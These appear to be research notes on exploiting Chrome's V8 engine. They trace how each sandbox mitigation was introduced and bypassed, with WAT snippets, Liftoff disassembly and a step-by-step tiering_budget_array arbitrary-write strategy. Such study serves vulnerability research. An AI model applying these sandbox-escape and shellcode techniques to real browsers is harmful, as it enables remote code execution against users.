# Current state of V8 Exploitation

### Objective:

```
Bug -> Primatives -> RWX -> RCE 
```

- If you have arb r/w and you can leak the location of RWX, you can slowly write in your shellcode 4/8 bytes by 4/8 bytes

- On earlier versions of Chrome, where we could r/w the backing store of ArrayBuffers, we can simply change it to the location of the RWX space and abuse the native JavaScript functions such as `.set()` to quickly write in our shellcode

### RCE:

Prior to "Early 2018" (as per [phrack](http://www.phrack.org/issues/70/9.html))

- JIT functions are RWX

- We can JIT a function to create RWX space, before using our primatives to write shellcode and obtain RCE (ezpz)

- [Mitigation: R-X/RW-X](https://github.com/v8/v8/commit/14917b6531596d33590edb109ec14f6ca9b95536) (a.k.a [W^X](https://en.wikipedia.org/wiki/W%5EX))

    > Bypass #1: Bitmap flip FLAG_write_protect_code_memory - need Arbitrary R/W, [see](https://tiszka.com/blog/CVE_2021_21225_exploit.html)

Prior to TPT (Ubercage)

- Abuse WASM spaces which are RWX

- [Mitigation: kWebAssemblyCodeProtectionPku (Protects RWX WASM from being written)](https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/)

    > Bypass #1: Bitmap flip FLAG_write_protect_code_memory via OfflineAudioContext (set to 0) - need Arbitrary R/W, [see](https://tiszka.com/blog/CVE_2021_21225_exploit.html)

Prior to CPT (Ubercage)

- JIT "Shellcoding"?

- Even though JIT code are R-X, we can spray an array of functions such as `const jit = () => { return [1.1, 2.2, 3.3, 4.4] }`

- Each float is 64 bits and we can "hide" shellcode in the floats before "jumping" from float to float in order to get a full RCE

### Obtaining Arbitrary R/W

Prior to Chrome 80 as per [gpz](https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-exploits.html)

- Pointer Compression NOT used

- No V8 "sandbox" (pointer compression is not really a proper sandbox but it does ensure that if you write a backing store in a form of a compressed pointer such as the element or property pointers, your primatives can only work in the V8 heap space)

- We can easily obtain arbitrary r/w (ezpz)

Prior to ArrayBuffer sandboxing (Ubercage)

- In order to obtain arbitrary r/w, we need to be able to control raw pointers. A commonly abused raw pointer is backing stores in ArrayBuffer objects

- We can escalate sandboxed/compressed r/w into arbitrary r/w by reading and writing 64 bits into the compressed heap space of V8. If we have an OOB object, we can possibly abuse it to write to raw pointers as well (just like how we can write compressed pointers)

# Ubercage

Monitor [here](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/sandbox/README.md). Some important V8 commits for the respective Chromium releases are as follows:

- 121.0.6167.189/121.0.6167.187: 1fbb9881419d2c7c278a60

- 122.0.6261.57: 7ca8cf1710353b309b30a2

- 117.0.5897.3: ac86404fa5d29c19d3e4b2f

- 116.0.5845.42: 762df8e03839d3f6ca67c

### 

https://ungoogled-software.github.io/ungoogled-chromium-binaries/releases/windows/64bit/

https://filehippo.com/download_google-chrome/

https://downzen.com/en/windows/google-chrome/versions/?page=1

https://www.filepuma.com/download/google_chrome_64bit_-932/versions/page/1/

https://bestim.org/chrome-102.html

https://download-com-vn.translate.goog/download/google-chrome-8641?linkid=82947&_x_tr_sl=vi&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=sc

https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/

### Sandboxifying Backing Stores

- Backing Stores are used to create Arbitrary R/W and RCE primitives, and historically stored as 64bit pointers and are easily read using compressed read/write primitives

- If we can control the backing store, we can construct arbitrary R/W primitives via compressed R/W

- If we can control the backing store, we can store shellcode and create RCE

- One feature of Ubercage sandboxifies the backing stores - instead of storing the actual pointer itself, we store indices which can be resolved to the respective backing store

- This feature seems to be implemented from Chrome 103 and onwards for Windows platforms

    ![](./screenshots/ubercage_sandboxify_backingstores//Chrome_102.0.5005.63_ArrayBuffer_BackingStore.png)
    *Chrome 102.0.5005.63 (Last apprent version of Chrome before ArrayBuffer Backing Store were sandboxed)*

    ![](./screenshots/ubercage_sandboxify_backingstores//Chrome_104.0.5112.81_ArrayBuffer_BackingStore-2.png)
    *Chrome 104.0.5112.81*

- In order to bypass this and still create RCE without arbitrary R/W primitives, we can use JIT Spraying/Shellcoding

### External Pointer Table (July 2022)

- Sandboxifies raw pointers to blink objects stored in its V8 counter parts, as per [documentation](https://docs.google.com/document/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk/edit#heading=h.xzptrog8pyxf)

- Prior to EPT, we can directly access the blink pointers of blink Objects in the V8 heap

    ![](./screenshots/ubercage_ept/chrome_106.0.5249.103_no_ept.png)

- EPT was introduced in Chrome 107 on Windows

    ![](./screenshots/ubercage_ept/chrome_107.0.5304.107_ept.png)

- In order to still obtain the blink address of blink objects, we would need to understand how v8 calculates it. We can search for `*GetExternalPointer*` in Chromium source code and obtain the following results:

    ```
    V8_INLINE static Address ReadExternalPointerField(v8::Isolate* isolate,
                                                        Address heap_object_ptr,
                                                        int offset) {
    #ifdef V8_ENABLE_SANDBOX
        static_assert(tag != kExternalPointerNullTag);
        // See src/sandbox/external-pointer-table-inl.h. Logic duplicated here so
        // it can be inlined and doesn't require an additional call.
        Address* table = IsSharedExternalPointerType(tag)
                            ? GetSharedExternalPointerTableBase(isolate)
                            : GetExternalPointerTableBase(isolate);
        internal::ExternalPointerHandle handle =
            ReadRawField<ExternalPointerHandle>(heap_object_ptr, offset);
        uint32_t index = handle >> kExternalPointerIndexShift;
        std::atomic<Address>* ptr =
            reinterpret_cast<std::atomic<Address>*>(&table[index]);
        Address entry = std::atomic_load_explicit(ptr, std::memory_order_relaxed);
        return entry & ~tag;
    #else
        return ReadRawField<Address>(heap_object_ptr, offset);
    #endif  // V8_ENABLE_SANDBOX
    }
    ...
    V8_INLINE static Address* GetExternalPointerTableBase(v8::Isolate* isolate) {
        Address addr = reinterpret_cast<Address>(isolate) +
                        kIsolateExternalPointerTableOffset +
                        kExternalPointerTableBasePointerOffset;
        return *reinterpret_cast<Address**>(addr);
    }
    ```

- The calculations are as follows:

    1. Algorithm to calculate address to TPT: TPTBaseAddress = Isolate+OffsetToTPT

    2. Algorithm to calculate index of TPT to JSFunc: TPTIndex = (handle >> kExternalPointerIndexShift) * ExternalPointerEntrySpace

    3. Final Address: EPTBaseAddress+EPTIndex

### Code Pointer Table (December 2022/July 2023)

- Sandboxifies code pointers to native code created by JITed functions, as per [documentation](https://docs.google.com/document/d/1CPs5PutbnmI-c5g7e_Td9CNGh5BvpLleKCqUnqmD82k/edit#heading=h.xzptrog8pyxf)

- CPT was introduced into V8 and hence Chrome source code on [Jul 6, 2023](https://groups.google.com/g/v8-reviews/c/bLrgEfZNGZ4) which should indicate that the CPT was introduced in Chrome 115 and the last version without CPT should be in Chrome 114. However, the JIT spray technique seems to be viable till Chrome 116, so the CPT was fully functioning from Chrome 117 onwards?

    - Chrome release dashboard (windows)

        ![](./screenshots/ubercage_cpt/before_cpt_commit.png)

    - Chrome 116 (with no CPT)

        ![](./screenshots/ubercage_cpt/chrome_116.0.5845.42_v8_no_cpt.png)

    - Chrome 117 (with CPT) - realise that the pointer no native code is no longer found here

        ![](./screenshots/ubercage_cpt/chrome_117.0.5897.3_cpt.png)

- On Windows, this doesnt rly matter cause we can continue abusing the shit out of WASM on windows from Chrome 110 (till Chrome 122 when they sandboxified the raw pointer to the RWX space via WasmTrustedInstanceData)

- If we are still interested in executing JIT spray, I think it is still possible? All we need to do is to figure out where the handle is located and the algorithm used to convert the handle to an index, as well as the algorithm to calculate the address to the CPT

    1. Algorithm to calculate address to CPT: CPTBaseAddress = ExternalEntityTable[CodePointerTableEntryIndex]

        ![](./screenshots/ubercage_cpt/chrome_117.0.5897.3_v8_retrieval_of_external_entity_table_base.png)

    2. Algorithm to calculate index of CPT to JSFunc: CPTIndex = (handle >> kCodePointerIndexShift) * CodePointerEntrySpace

        ![](./screenshots/ubercage_cpt/chrome_117.0.5897.3_v8_retrieval_of_external_entity_table_base.png)

        - Each CodePointerEntrySpace is 16 bytes as seen in the previous screenshot, hence we do a shl 4 because shl 4 is equivalent to x16

    3. Final Address: CPTBaseAddress+CPTIndex

        ![](./screenshots/ubercage_cpt/chrome_117.0.5897.3_v8_retrieval_of_actual_address.png)

### Trusted Pointer Table (October 2023/December 2023)

- Sandboxifies pointers to Heap Objects located outside the V8 Heap found in V8 objects, as per [documentation](https://docs.google.com/document/d/1IrvzL4uX_Zv0k2Iakdp_q_z33bj-qlYF5IesGpXW0fM/edit).

- On [Dec 5, 2023](https://groups.google.com/g/v8-reviews/c/lQc9yuGq0iI), chrome sandboxified raw pointers to RWX space from WASM Instances by putting the WASM Instances into trusted space, implemented from Chrome 122 and onwards

- This is a very big issue as we can no longer abuse WASM spaces to obtain RCE

- In order to bypass this, we will need to figure out how the handles are converted to the actual raw pointers in the TPT

    1. Algorithm to calculate address to TPT: TPTBaseAddress = Isolate+OffsetToTPT

        ![](./screenshots/ubercage_tpt/chrome_122.0.6261.57_tpt.png)

    2. Algorithm to calculate index of TPT: TPTIndex = (handle >> kTrustedPointerIndexShift) * TrustedPointerEntrySpace

        ![](./screenshots/ubercage_tpt/chrome_122.0.6261.57_handle_to_tpt_entry.png)

    3. Final Address: TPTBaseAddress+TPTIndex

        ![](./screenshots/ubercage_tpt/chrome_122.0.6261.57_rwx.png)

### External Buffer Table

https://groups.google.com/g/v8-reviews/c/fgJFek3SR4Q

### Cpp Heap Pointer Table

https://groups.google.com/a/chromium.org/g/oilpan-reviews/c/ubYUcgNJeT0

# Ubercage SBX

### Leaking Cage Base

- Base address of the cage can be easily leaked using the sandboxed read/write primitives. Since we can technically set the compressed pointer value from 0x0 to 0xFFFFFFFF, we can read the starting few values of the V8 heap base which should have some references, this technique was used in Dice CTF 2022 Memory Hole

    ![](../Chrome-CTF/dicectf2022._challenge/screenshots/search_for_js_heap_base.png)

- We can create "extended" sandboxed primitives which can read "slightly" out of the V8 heap space using TypedArrays. By manipulating the external pointer and the base pointer values, we can read up to 0xFFFFFFFF00+0xFFFFFFFF from the V8 heap base. This technique was used in Dice CTF 2022 Memory Hole

    ![](../Chrome-CTF/anvbis.au_challenge/screenshots/typedarray_rw_primitives.png)

- We can also stuff our shellcode in a TypedArray, manually calculate the full pointer to its backing store (only requiring sandboxed primitives), before copying the shellcode over to our RWX space (requiring arbitrary write primitives).

### JIT Spraying/Shellcoding

- This technique bypasses W^X protection on JIT Functions and WASM spaces (because we can RCE without WASM).

- It is stable on x86_64 based OSes (Windows and some families of Linux) until CPT was introduced, where the code pointers are replaced by indices and only accessible via the code pointer table.

- In CVE-2018-17463, we briefly went through the possibility of bypassing W^X protection on JIT-ed functions but did not dive into it due to the fact that we could get away with abusing WASM spaces

- The introduction of W^X protection on WASM spaces (from Chrome 100 and onwards up till before Chrome 110 for Windows) did not deter us from continue using WASM to RCE due to the fact that we could still create arbitrary r/w primitives by bitmap flipping the appropriate locations in chrome in order to disable the protection ([wasm_write_protect_code_memory](https://medium.com/deno-the-complete-reference/v8-flags-supported-by-deno-f5f7a946dadb)). Verified the versions manually... 

- I'm guessing the reason why WASM was set back to RWX from chrome 110 onwards was due to maybe the belief that because of Ubercage and the sandboxifying of arraybuffer backing stores, they wouldn't need to implement the W^X protection on WASM spaces and hence removed it to improve efficiency (an interpreted waste of setting the WASM space from RW- to R-X and vice versa)

- In Chrome 103, arraybuffer backingstores were sandboxed and in order to access the backingstore, you would need to find the base location of the v8 sandbox and add it with index*0x100 (as per the [documentation](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit), this base location is found in r14). With this, we lose our arbiterary read/write primitives

    ![](./screenshots/ubercage_sandboxify_backingstores/Chrome_104.0.5112.81_ArrayBuffer_BackingStore-1.png)

    ![](./screenshots/ubercage_sandboxify_backingstores/Chrome_104.0.5112.81_ArrayBuffer_BackingStore-2.png)

- Looking at how JIT-ed functions work when returning floats, we observe that we can smuggle shellcode inside floats as seen in CVE-2018-17463, we need to note that:

    1. The maximum length of each instruction needs to be lesser or equal to 6 bytes (cause we also need to jump to our next float)

    2. In Windows, where we need to craft Position Independent shellcode, jumping and calling is a pain but still possible

    3. We need to make sure that each float is unique if not V8 will optimise the way the floats are passed around (instead of generating the 8 byte integer, it will simply play around with the float registers with the duplicate values)

- `jit_spraying.py` is a script which will generate the appropriate Uint8Array which we can later convert to a float array

- Here, we are able to bypass the W^X protections implemented without needing any arbitrary r/w primitives. Tested with CVE-2023-2033 on Chrome 109.

### imported_mutable_globals

- This technique allows us to obtain arbitrary write/read primitive primitives, patched on [August 29, 2022](https://chromium-review.googlesource.com/c/v8/v8/+/3845636)

- imported_mutable_globals is created when our WASM instance has a WASM Global object. This WASM Global object is in the V8 space and can be referenced via the WASMInstance object as a half-pointer. The half-pointer points to a full pointer which points another full pointer (actual location of the Global Object) which points to the actual value of the Global Object.

    ```
    var global = new WebAssembly.Global({value:'i64', mutable:true}, 0n); 
    ...
    var wasm_instance = new WebAssembly.Instance(wasm_mod, {js: {global}});
    ```

    ```
    (module
        ;; need to make sure this matches with what you are importing and how you are importing it
        (global $g (import "js" "global") (mut i64)) 
        (func (export "getGlobal") (result i64)
                (global.get $g))
        (func (export "incGlobal")
                (global.set $g
                    (i64.add (global.get $g) (i64.const 1))))
        (func (export "setGlobal") (param $p1 i64)
                (global.set $g (local.get $p1)))
    )
    ```

    ```
    wasm_instance -> imported_global_mutables -> full_pointer_to_js_global -> value
    ```

- The reason why its a full pointer to another full pointer is because I am guessing that you can import more than 1 global WASM object

- Anyway, since we can control the imported_global_mutables pointer, we can set it to a pointer which points to the address we want to arbitrarily read/write to/from

- You can reference my attempt at the DiceCTF 2022 Memory Hole challenge to see the full exploitation method to abuse this technique to get RCE (note that there is no W^X on WASM and there is no TPT for this challenge, but even if there was, I do not think it will be an issue since we have arbitrary r/w primitives)

### indirect_function_tables

- This technique allows us to obtain arbitrary write primitive, [patched on July 21, 2023](https://chromium-review.googlesource.com/c/v8/v8/+/4687708). Tested with CVE-2023-2033 on Chrome 109.

- Transfer later

### tiering_budget_array

- This technique allows us to obtain arbitrary write primitive, first reported [here](https://issues.chromium.org/issues/40068627) and patched with the introduction of TPT

- Covered in detail in [retr0.zip](https://retr0.zip/blog/abusing-Liftoff-assembly-and-efficiently-escaping-from-sbx.html) and used in this [bug report](https://issues.chromium.org/issues/41488920) to obtain Renderer RCE with CVE-2024-0517

- Basically for certain WASM functions, liftoff (WASM Compiler) will generate the various native codes to be executed for the respective functions. We see that for the following WASM function created via WAT code, we will generate the following bytecode:

    ```
    (func $arb_write (;2;) (export "arb_write") (param $var0 i32) (param $var1 i64)
        local.get $var0
        local.get $var1
        i64.store
    )
    ```

    ```
    0x2cf5c10ebc80     0  55                   push rbp
    0x2cf5c10ebc81     1  4889e5               REX.W movq rbp,rsp
    0x2cf5c10ebc84     4  6a08                 push 0x8
    0x2cf5c10ebc86     6  56                   push rsi
    0x2cf5c10ebc87     7  4881ec10000000       REX.W subq rsp,0x10
    0x2cf5c10ebc8e     e  493b65a0             REX.W cmpq rsp,[r13-0x60]
    0x2cf5c10ebc92    12  0f8623000000         jna 0x2cf5c10ebcbb  <+0x3b>
    0x2cf5c10ebc98    18  488b4e27             REX.W movq rcx,[rsi+0x27]
    0x2cf5c10ebc9c    1c  48c1e918             REX.W shrq rcx, 24
    0x2cf5c10ebca0    20  4903ce               REX.W addq rcx,r14
    0x2cf5c10ebca3    23  48891401             REX.W movq [rcx+rax*1],rdx
    0x2cf5c10ebca7    27  4c8b5677             REX.W movq r10,[rsi+0x77]
    0x2cf5c10ebcab    2b  41836a0827           subl [r10+0x8],0x27
    0x2cf5c10ebcb0    30  0f8814000000         js 0x2cf5c10ebcca  <+0x4a>
    0x2cf5c10ebcb6    36  488be5               REX.W movq rsp,rbp
    0x2cf5c10ebcb9    39  5d                   pop rbp
    0x2cf5c10ebcba    3a  c3                   retl
    0x2cf5c10ebcbb    3b  50                   push rax
    0x2cf5c10ebcbc    3c  52                   push rdx
    0x2cf5c10ebcbd    3d  e83ef6ffff           call 0x2cf5c10eb300  (jump table)
    0x2cf5c10ebcc2    42  5a                   pop rdx
    0x2cf5c10ebcc3    43  58                   pop rax
    0x2cf5c10ebcc4    44  488b75f0             REX.W movq rsi,[rbp-0x10]
    0x2cf5c10ebcc8    48  ebce                 jmp 0x2cf5c10ebc98  <+0x18>
    0x2cf5c10ebcca    4a  50                   push rax
    0x2cf5c10ebccb    4b  51                   push rcx
    0x2cf5c10ebccc    4c  52                   push rdx
    0x2cf5c10ebccd    4d  e88ef4ffff           call 0x2cf5c10eb160  (jump table)
    0x2cf5c10ebcd2    52  5a                   pop rdx
    0x2cf5c10ebcd3    53  59                   pop rcx
    0x2cf5c10ebcd4    54  58                   pop rax
    0x2cf5c10ebcd5    55  488b75f0             REX.W movq rsi,[rbp-0x10]
    0x2cf5c10ebcd9    59  ebdb                 jmp 0x2cf5c10ebcb6  <+0x36>
    0x2cf5c10ebcdb    5b  90                   nop
    ```

    - What this normally does is that it will basically store $var1 to the location of WASM Memory backing store + $var0

    - For `REX.W movq rcx,[rsi+0x27]`: rsi is the wasm_instance, and at +0x27 offset is an offset from a base value X which will add up to the backing store of the WASM Memory object. This offset is left bit shifted by 24

    - For `REX.W addq rcx,r14`: r14 is the base value X

    - For `REX.W movq [rcx+rax*1],rdx`: rax is $var0 while rdx is $var1 

    - If we can "control" r14 and rcx and somehow NULL them out, we can achieve an arbitrary write primitive :)

- Next we can look at the following 2 WASM Functions and the respective bytecode generated by Liftoff:

    ```
    (func $nop (;0;) (export "nop")
        nop
    )

    (func $nop2 (;1;) (export "nop2")
        nop
        i32.const 0
        i32.const 57005
        i32.store
        i32.const 1
        i32.const 57005
        i32.store
    )
    ```

    ```
    0x2cf5c10ebb80     0  55                   push rbp
    0x2cf5c10ebb81     1  4889e5               REX.W movq rbp,rsp
    0x2cf5c10ebb84     4  6a08                 push 0x8
    0x2cf5c10ebb86     6  56                   push rsi
    0x2cf5c10ebb87     7  4881ec10000000       REX.W subq rsp,0x10
    0x2cf5c10ebb8e     e  493b65a0             REX.W cmpq rsp,[r13-0x60]
    0x2cf5c10ebb92    12  0f8613000000         jna 0x2cf5c10ebbab  <+0x2b>
    0x2cf5c10ebb98    18  4c8b5677             REX.W movq r10,[rsi+0x77]
    0x2cf5c10ebb9c    1c  41832a18             subl [r10],0x18
    0x2cf5c10ebba0    20  0f8810000000         js 0x2cf5c10ebbb6  <+0x36>
    0x2cf5c10ebba6    26  488be5               REX.W movq rsp,rbp
    0x2cf5c10ebba9    29  5d                   pop rbp
    0x2cf5c10ebbaa    2a  c3                   retl
    0x2cf5c10ebbab    2b  e850f7ffff           call 0x2cf5c10eb300  (jump table)
    0x2cf5c10ebbb0    30  488b75f0             REX.W movq rsi,[rbp-0x10]
    0x2cf5c10ebbb4    34  ebe2                 jmp 0x2cf5c10ebb98  <+0x18>
    0x2cf5c10ebbb6    36  e8a5f5ffff           call 0x2cf5c10eb160  (jump table)
    0x2cf5c10ebbbb    3b  488b75f0             REX.W movq rsi,[rbp-0x10]
    0x2cf5c10ebbbf    3f  ebe5                 jmp 0x2cf5c10ebba6  <+0x26>
    0x2cf5c10ebbc1    41  0f1f00               nop

    0x2cf5c10ebc00     0  55                   push rbp
    0x2cf5c10ebc01     1  4889e5               REX.W movq rbp,rsp
    0x2cf5c10ebc04     4  6a08                 push 0x8
    0x2cf5c10ebc06     6  56                   push rsi
    0x2cf5c10ebc07     7  4881ec10000000       REX.W subq rsp,0x10
    0x2cf5c10ebc0e     e  493b65a0             REX.W cmpq rsp,[r13-0x60]
    0x2cf5c10ebc12    12  0f862e000000         jna 0x2cf5c10ebc46  <+0x46>
    0x2cf5c10ebc18    18  b8adde0000           movl rax,0xdead
    0x2cf5c10ebc1d    1d  488b4e27             REX.W movq rcx,[rsi+0x27]
    0x2cf5c10ebc21    21  48c1e918             REX.W shrq rcx, 24
    0x2cf5c10ebc25    25  4903ce               REX.W addq rcx,r14
    0x2cf5c10ebc28    28  8901                 movl [rcx],rax
    0x2cf5c10ebc2a    2a  b8adde0000           movl rax,0xdead
    0x2cf5c10ebc2f    2f  894101               movl [rcx+0x1],rax
    0x2cf5c10ebc32    32  4c8b5677             REX.W movq r10,[rsi+0x77]
    0x2cf5c10ebc36    36  41836a0432           subl [r10+0x4],0x32
    0x2cf5c10ebc3b    3b  0f8810000000         js 0x2cf5c10ebc51  <+0x51>
    0x2cf5c10ebc41    41  488be5               REX.W movq rsp,rbp
    0x2cf5c10ebc44    44  5d                   pop rbp
    0x2cf5c10ebc45    45  c3                   retl
    0x2cf5c10ebc46    46  e8b5f6ffff           call 0x2cf5c10eb300  (jump table)
    0x2cf5c10ebc4b    4b  488b75f0             REX.W movq rsi,[rbp-0x10]
    0x2cf5c10ebc4f    4f  ebc7                 jmp 0x2cf5c10ebc18  <+0x18>
    0x2cf5c10ebc51    51  51                   push rcx
    0x2cf5c10ebc52    52  e809f5ffff           call 0x2cf5c10eb160  (jump table)
    0x2cf5c10ebc57    57  59                   pop rcx
    0x2cf5c10ebc58    58  488b75f0             REX.W movq rsi,[rbp-0x10]
    0x2cf5c10ebc5c    5c  ebe3                 jmp 0x2cf5c10ebc41  <+0x41>
    0x2cf5c10ebc5e    5e  6690                 nop
    ```

    - Notice `REX.W movq r10,[rsi+0x77] ; subl [r10],0x18` created by nop() and `REX.W movq r10,[rsi+0x77] ; subl [r10+0x4],0x32` created by nop2()

    - rsi is (as usual) the WASM instance and the +0x77 offset actually refers to the tiering_budget_array of the WASM instance

    - For both nop() and nop2(), we observe that we will attempt to subtract a constant value from tiering_budget_array value

    - This tiering_budget_array is accessible from the V8 sandbox and hence corruptable by our common primitives that we obtain via a V8 bug (sandbox R/W). Hence, we can obtain a "relative" write from changing the value of this tiering_budget_array. This "relative" write gives us the privilege to subtract a constant value from any full pointer

- Strategy:

    1. Using the relative write, we will create a more controlled relative write (e.g. `subl [r10],0x2`). We can do this by setting the pointer to `subl [r10+0x4],0x32` as the tiering_budget_array. When we call nop(), we will subtract the first byte of the corrupted tiering_budget_array by 0x18. The first byte needs to be `0x32`. We will call it twice to convert `subl [r10+0x4],0x32` into `subl [r10+0x4],0x2`

    2. Once we obtain a controlled relative write callable via nop2(), then we can use nop2() to corrupt the mov, add and shr instructions of the arb_write() WASM function to create a proper arbitrary write

    3. Escape!

        ![](./screenshots/liftoff_tiering_budget_array/arbitrary_write_achieved.png)

### WASM Arbitrary Write

- This technique was used by [Exodus](https://blog.exodusintel.com/2024/01/19/google-chrome-v8-cve-2024-0517-out-of-bounds-write-code-execution/) and was patched with TPT

- Basically, do shellcode spraying using WAT. Spray and find the offset to write opcodes (e.g. `mov [rax], rdx ; ret ;`)

- Overwrite RIP with the address to the above WAT opcodes. EZ Arbitrary Write :).

- Some interesting things to note when controlling RIP via overwriting jump_start_table (this is due to how WASM functions are initialized and compiled which I will not dive into):

    ```
    overwrite_rip_with_0x41414141414141()
    wasm.exports.function(0xcafe, 0xbabe) // will segfault at 0x41414141414141 but no register control
    ```

    ```
    wasm.exports.function(0xcafe, 0xbabe)
    overwrite_rip_with_0x41414141414141()
    wasm.exports.function(0xcafe, 0xbabe) // will not segfault
    ```

    ```
    wasm.exports.function(0xcafe, 0xbabe)
    overwrite_rip_with_0x41414141414141()
    wasm.exports.function2(0xdead, 0xbeef) // will segfault at 0x41414141414141 and with register control
    ```

### WASM Spraying/Shellcoding

- Generic technique which involves spraying shellcode into WASM spaces to get RCE or to get Arbitrary Write primitives

- Some examples are found below

    1. [numencyberlabs #1](https://medium.com/@numencyberlabs/use-wasm-to-bypass-latest-chrome-v8sbx-again-639c4c05b157)

    2. [numencyberlabs #2](https://medium.com/@numencyberlabs/use-native-pointer-of-function-to-bypass-the-latest-chrome-v8-sandbox-exp-of-issue1378239-251d9c5b0d14)

    3. [Custom WASM shellcoding to inject ROP gadgets](https://github.com/candymate/csed499I-01/blob/master/README.md) ## interesting technique, never seen it before!

    4. [Uniguri N-day exploit with CVE-2024-0517](https://github.com/Uniguri/CVE-nday/blob/master/Chrome/V8/CVE-2024-0517/exploit/poc_for_linux.js)

### UaF Case Studies/CTFs

- https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf/

- https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/ (maybe dont need if similar enough)

- https://blog.perfect.blue/Chromium-Fullchain

- https://www.exploit-db.com/exploits/50917

- https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_1/

- https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_2/

- https://github.blog/security/vulnerability-research/attack-of-the-clones-getting-rce-in-chromes-renderer-with-duplicate-object-properties/


